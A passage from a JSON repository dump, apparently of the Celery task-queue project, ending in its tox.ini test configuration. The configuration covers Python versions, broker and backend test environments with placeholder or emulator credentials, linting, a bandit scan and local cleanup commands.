Language :: Python :: Implementation :: PyPy\",\n        \"Operating System :: OS Independent\"\n    ]\n)\n"
        },
        {
          "name": "t",
          "type": "tree",
          "content": null
        },
        {
          "name": "tox.ini",
          "type": "blob",
          "size": 4.23,
          "content": "[tox]\nrequires =\n    tox-gh-actions\nenvlist =\n    {3.8,3.9,3.10,3.11,3.12,3.13,pypy3}-unit\n    {3.8,3.9,3.10,3.11,3.12,3.13,pypy3}-integration-{rabbitmq_redis,rabbitmq,redis,dynamodb,azureblockblob,cache,cassandra,elasticsearch,docker}\n    {3.8,3.9,3.10,3.11,3.12,3.13,pypy3}-smoke\n\n    flake8\n    apicheck\n    configcheck\n    bandit\n\n\n[gh-actions]\npython =\n    3.8: 3.8-unit\n    3.9: 3.9-unit\n    3.10: 3.10-unit\n    3.11: 3.11-unit\n    3.12: 3.12-unit\n    3.13: 3.13-unit\n    pypy-3: pypy3-unit\n\n[testenv]\nsitepackages = False\nrecreate = False\npassenv =\n    AZUREBLOCKBLOB_URL\n\ndeps=\n    -r{toxinidir}/requirements/test.txt\n    -r{toxinidir}/requirements/pkgutils.txt\n\n    3.8,3.9,3.10,3.11,3.12,3.13: -r{toxinidir}/requirements/test-ci-default.txt\n    3.8,3.9,3.10,3.11,3.12,3.13: -r{toxinidir}/requirements/docs.txt\n    pypy3: -r{toxinidir}/requirements/test-ci-default.txt\n\n    integration: -r{toxinidir}/requirements/test-integration.txt\n    smoke: pytest-xdist>=3.5\n\n    linkcheck,apicheck,configcheck: -r{toxinidir}/requirements/docs.txt\n    lint: pre-commit\n    bandit: bandit\n\ncommands =\n    unit: pytest -vv --maxfail=10 --capture=no -v --cov=celery --cov-report=xml --cov-report term {posargs}\n    integration: pytest -xsvv t/integration {posargs}\n    smoke: pytest -xsvv t/smoke --dist=loadscope --reruns 5 --reruns-delay 10 {posargs}\nsetenv =\n    PIP_EXTRA_INDEX_URL=https://celery.github.io/celery-wheelhouse/repo/simple/\n    BOTO_CONFIG = /dev/null\n    WORKER_LOGLEVEL = INFO\n    PYTHONIOENCODING = UTF-8\n    PYTHONUNBUFFERED = 1\n    PYTHONDONTWRITEBYTECODE = 1\n\n    cache: TEST_BROKER=redis://\n    cache: TEST_BACKEND=cache+pylibmc://\n\n    cassandra: TEST_BROKER=redis://\n    cassandra: TEST_BACKEND=cassandra://\n\n    elasticsearch: TEST_BROKER=redis://\n    elasticsearch: TEST_BACKEND=elasticsearch://@localhost:9200\n\n    rabbitmq: TEST_BROKER=pyamqp://\n    rabbitmq: TEST_BACKEND=rpc\n\n    redis: TEST_BROKER=redis://\n    redis: TEST_BACKEND=redis://\n\n    rabbitmq_redis: TEST_BROKER=pyamqp://\n    rabbitmq_redis: TEST_BACKEND=redis://\n\n    docker: TEST_BROKER=pyamqp://rabbit:5672\n    docker: TEST_BACKEND=redis://redis\n\n    dynamodb: TEST_BROKER=redis://\n    dynamodb: TEST_BACKEND=dynamodb://@localhost:8000\n    dynamodb: AWS_ACCESS_KEY_ID=test_aws_key_id\n    dynamodb: AWS_SECRET_ACCESS_KEY=test_aws_secret_key\n\n    azureblockblob: TEST_BROKER=redis://\n    azureblockblob: TEST_BACKEND=azureblockblob://DefaultEndpointsProtocol=http;AccountName=devstoreaccount1;AccountKey=Eby8vdM02xNOcqFlqUwJPLlmEtlCDXJ1OUzFT50uSRZ6IFsuFq2UVErCz4I6tq/K1SZFPTOtr/KBHBeksoGMGw==;BlobEndpoint=http://127.0.0.1:10000/devstoreaccount1;\n\nbasepython =\n    3.8: python3.8\n    3.9: python3.9\n    3.10: python3.10\n    3.11: python3.11\n    3.12: python3.12\n    3.13: python3.13\n    pypy3: pypy3\n    mypy: python3.13\n    lint,apicheck,linkcheck,configcheck,bandit: python3.13\nusedevelop = True\n\n[testenv:mypy]\ncommands = python -m mypy --config-file pyproject.toml\n\n[testenv:apicheck]\nsetenv =\n    PYTHONHASHSEED = 100\ncommands =\n    sphinx-build -j2 -b apicheck -d {envtmpdir}/doctrees docs docs/_build/apicheck\n\n[testenv:configcheck]\ncommands =\n    sphinx-build -j2 -b configcheck -d {envtmpdir}/doctrees docs docs/_build/configcheck\n\n[testenv:linkcheck]\ncommands =\n    sphinx-build -j2 -b linkcheck -d {envtmpdir}/doctrees docs docs/_build/linkcheck\n\n[testenv:bandit]\ncommands =\n    bandit -b bandit.json -r celery/\n\n[testenv:lint]\ncommands =\n    pre-commit {posargs:run --all-files --show-diff-on-failure}\n\n[testenv:clean]\ndeps = cleanpy\nallowlist_externals = bash, make, rm\ncommands =\n    bash -c 'files=$(find . -name \"*.coverage*\" -type f); if [ -n \"$files\" ]; then echo \"Removed coverage file(s):\"; echo \"$files\" | tr \" \" \"\\n\"; rm $files; fi'\n    bash -c 'containers=$(docker ps -aq --filter label=creator=pytest-docker-tools); if [ -n \"$containers\" ]; then echo \"Removed Docker container(s):\"; docker rm -f $containers; fi'\n    bash -c 'networks=$(docker network ls --filter name=pytest- -q); if [ -n \"$networks\" ]; then echo \"Removed Docker network(s):\"; docker network rm $networks; fi'\n    bash -c 'volumes=$(docker volume ls --filter name=pytest- -q); if [ -n \"$volumes\" ]; then echo \"Removed Docker volume(s):\"; docker volume rm $volumes; fi'\n    python -m cleanpy .\n    make clean\n    rm -f test.db statefilename.db 86\n"
        }
      ]
    }
  ]
}